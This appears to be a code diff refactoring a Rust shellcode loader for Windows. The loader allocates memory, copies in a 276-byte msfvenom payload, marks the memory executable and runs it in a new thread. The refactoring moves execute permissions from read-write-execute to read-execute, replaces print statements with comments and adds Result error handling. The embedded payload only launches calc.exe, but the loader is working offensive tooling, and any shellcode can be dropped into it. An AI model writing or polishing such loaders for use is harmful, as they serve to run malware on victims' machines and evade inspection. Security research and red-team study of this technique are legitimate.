@@ -1,16 +1,20 @@
-use std::ptr::{copy, null, null_mut};
+use windows::core::Result;
 use windows::Win32::{
     Foundation::{CloseHandle, GetLastError},
     System::{
         Memory::{
-            VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+            VirtualAlloc, VirtualProtect, MEM_COMMIT, 
+            MEM_RESERVE, PAGE_EXECUTE_READ,
             PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
         },
-        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
+        Threading::{
+            CreateThread, WaitForSingleObject, 
+            INFINITE, THREAD_CREATION_FLAGS
+        },
     },
 };
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -35,9 +39,9 @@ fn main() {
     ];
 
     unsafe {
-        println!("[+] Memory Allocation Being Performed");
+        // Allocate memory for the shellcode
         let address = VirtualAlloc(
-            Some(null_mut()),
+            None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -45,29 +49,35 @@ fn main() {
 
         if address.is_null() {
             eprintln!("[!] VirtualAlloc Failed With Error: {:?}", GetLastError());
-            return;
+            return Ok(());
         }
 
-        println!("[+] Copying a Shellcode To Target Memory");
-        copy(shellcode.as_ptr() as _, address, shellcode.len());
+        // Copy shellcode into allocated memory
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr().cast(), address, shellcode.len());
 
-        println!("[+] Changing Page Permissions");
+        // Change memory protections to executable
         let mut old_protection = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(address, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protection).expect("[!] VirtualProtect Failed With Error");
+        VirtualProtect(
+            address,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protection,
+        )?;
 
-        println!("[+] Thread Being Created");
+        // Create a thread to execute the shellcode
         let hthread = CreateThread(
-            Some(null()),
+            None,
             0,
             Some(std::mem::transmute(address)),
-            Some(null()),
+            None,
             THREAD_CREATION_FLAGS(0),
-            Some(null_mut()),
-        ).expect("[!] CreateThread Failed With Error");
+            None,
+        )?;
 
         println!("[+] Shellcode Executed!");
         WaitForSingleObject(hthread, INFINITE);
-
-        let _ = CloseHandle(hthread);
+        CloseHandle(hthread)?;
     }
+
+    Ok(())
 }
